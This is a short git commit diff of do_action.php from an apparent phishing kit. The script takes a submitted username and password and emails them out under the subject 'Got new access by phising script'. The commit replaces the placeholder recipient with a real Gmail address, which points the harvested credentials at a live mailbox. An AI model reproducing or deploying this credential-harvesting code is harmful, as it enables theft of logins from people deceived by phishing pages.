b46d5559b1b228631f33d27c188c92c7b8c0e1e1
Salmankhanmarwat <86137268+Salmankhanmarwat@users.noreply.github.com>
2021-06-19 07:28:54 +0500

    Update do_action.php

--- do_action.php
+++ do_action.php
@@ -8,7 +8,7 @@
 		$username = $_REQUEST['username'];
 		$password = $_REQUEST['password'];
 		
-		$reciever = "YOUR-EMAIL ADRRESS";
+		$reciever = "salmankhanmarwat580@gmail.com";
 		
 		$subject = "Got new access by phising script";
 		$message = "The username is ". $username;
